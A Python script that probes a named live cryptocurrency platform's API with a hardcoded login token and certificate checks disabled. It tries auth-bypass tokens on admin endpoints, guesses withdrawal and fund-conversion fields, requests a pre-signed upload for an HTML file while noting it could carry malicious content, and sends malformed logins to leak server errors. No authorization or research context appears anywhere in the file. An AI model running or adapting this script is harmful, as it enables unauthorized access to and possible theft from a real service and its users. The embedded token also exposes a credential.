"""
Riscoin - WebSocket exploration + Token manipulation + Withdrawal field discovery
"""
import requests, json, time, base64
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
TOKEN = "c6b1n91oo800_1jn770f8e"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "APP-LOGIN-TOKEN": TOKEN,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print("=" * 70)
print("TOKEN MANIPULATION")
print("=" * 70)

# Token format: c6b1n91oo800_1jn770f8e
# Pattern: {prefix}_{suffix}
# prefix = invitation code-like (c6b1n91oo800)
# suffix = random (1jn770f8e)

# Try manipulating token to access admin
# What if admin tokens follow a similar pattern?
print("\n--- Test: Use empty token ---")
h = {**H, "APP-LOGIN-TOKEN": ""}
r = requests.post(f"{BASE}/api/admin/user/list", json={}, headers=h, timeout=10, verify=False)
print(f"  Empty token: [{r.status_code}] {r.text[:200]}")

print("\n--- Test: Use 'admin' as token ---")
h = {**H, "APP-LOGIN-TOKEN": "admin"}
r = requests.post(f"{BASE}/api/admin/user/list", json={}, headers=h, timeout=10, verify=False)
print(f"  Token='admin': [{r.status_code}] {r.text[:200]}")

print("\n--- Test: Use null/undefined ---")
for tok in ["null", "undefined", "true", "1", "0"]:
    h = {**H, "APP-LOGIN-TOKEN": tok}
    r = requests.post(f"{BASE}/api/admin/user/list", json={}, headers=h, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100010:
        print(f"  *** DIFFERENT: Token='{tok}': errCode={err} | {r.text[:200]}")
    else:
        print(f"  Token='{tok}': errCode={err}")

# Test with our token on admin endpoints
print("\n--- Test: Our user token directly on admin endpoints ---")
admin_endpoints = [
    "/api/admin/user/list",
    "/api/admin/dashboard",
    "/api/admin/config",
    "/api/admin/system/config",
]
for ep in admin_endpoints:
    r = requests.post(f"{BASE}{ep}", json={}, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    print(f"  {ep}: errCode={err}")

print("\n" + "=" * 70)
print("WITHDRAWAL FIELD DISCOVERY (from payment endpoint)")
print("=" * 70)

# We know the payment info returns USDT config
# Let's try to find the correct withdrawal field names
print("\n--- Withdrawal address/coin info ---")
r = requests.post(f"{BASE}/api/app/withdraw/address/coin", json={}, headers=H, timeout=10, verify=False)
print(f"  /withdraw/address/coin: {r.text[:500]}")

r = requests.post(f"{BASE}/api/app/withdraw/payment", json={}, headers=H, timeout=10, verify=False)
print(f"\n  /withdraw/payment: {r.text[:500]}")

# Recharge info
r = requests.post(f"{BASE}/api/app/recharge/payment/info", json={}, headers=H, timeout=10, verify=False)
print(f"\n  /recharge/payment/info: {r.text[:500]}")

r = requests.post(f"{BASE}/api/app/recharge/payment/block/info", json={"standardId": "1"}, headers=H, timeout=10, verify=False)
print(f"\n  /recharge/payment/block/info (standardId=1): {r.text[:500]}")

print("\n" + "=" * 70)
print("FUND TRANSFER / CONVERSION EXPLORATION")
print("=" * 70)

# Conversion config (revealed 35% fee)
r = requests.post(f"{BASE}/api/app/conversion/config", json={}, headers=H, timeout=10, verify=False)
print(f"  /conversion/config: {r.text[:500]}")

# Conversion submit - try to discover fields
conversion_payloads = [
    {"from": 1, "to": 2, "amount": "1", "coinId": "USDT"},
    {"fromWalletType": 1, "toWalletType": 2, "amount": "1", "standardId": "1"},
    {"source": 1, "target": 2, "amount": "1"},
]
for payload in conversion_payloads:
    r = requests.post(f"{BASE}/api/app/conversion/submit", json=payload, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** DIFFERENT: {list(payload.keys())} -> errCode={err} | {r.text[:200]}")
    else:
        print(f"  [100003] /conversion/submit: {list(payload.keys())}")

print("\n" + "=" * 70)
print("UPLOAD / FILE MANIPULATION")
print("=" * 70)

# S3 pre-signed URL - could potentially be used to upload malicious content
r = requests.post(f"{BASE}/api/app/upload/s3/pre-signed", json={"fileName": "test.html", "type": "image"}, headers=H, timeout=10, verify=False)
print(f"  /upload/s3/pre-signed (html): {r.text[:500]}")

r = requests.post(f"{BASE}/api/app/upload/s3/pre-signed", json={"fileName": "test.jpg", "contentType": "image/jpeg"}, headers=H, timeout=10, verify=False)
print(f"\n  /upload/s3/pre-signed (jpg): {r.text[:500]}")

print("\n" + "=" * 70)
print("ERROR INFO ENDPOINT (may leak internal details)")
print("=" * 70)

r = requests.post(f"{BASE}/api/app/error/info", json={"code": 100010}, headers=H, timeout=10, verify=False)
print(f"  /error/info (100010): {r.text[:300]}")

r = requests.post(f"{BASE}/api/app/error/info", json={"code": 100178}, headers=H, timeout=10, verify=False)
print(f"  /error/info (100178): {r.text[:300]}")

r = requests.post(f"{BASE}/api/app/error/info", json={"errCode": 100178}, headers=H, timeout=10, verify=False)
print(f"  /error/info (errCode 100178): {r.text[:300]}")

print("\n" + "=" * 70)
print("SPRING BOOT ERROR LEAK")
print("=" * 70)

# Try to trigger verbose Spring Boot errors
bad_payloads = [
    (f"{BASE}/api/app/user/login", {"email": None, "password": None}, "null login"),
    (f"{BASE}/api/app/user/login", {"email": 12345, "password": 12345}, "int login"),
    (f"{BASE}/api/app/user/login", {"email": True, "password": True}, "bool login"),
    (f"{BASE}/api/admin/login", {"a": [1,2,3]}, "array in admin login"),
]

for url, payload, label in bad_payloads:
    r = requests.post(url, json=payload, headers=H, timeout=10, verify=False)
    try:
        j = r.json()
        err = j.get("errCode", j.get("status", "?"))
        if err not in [100003, 100001, 100007]:
            print(f"  *** DIFFERENT [{r.status_code}] {label}: {r.text[:300]}")
        else:
            print(f"  [{r.status_code}] {label}: errCode={err}")
    except:
        print(f"  [{r.status_code}] {label}: {r.text[:300]}")

print("\nDone.")
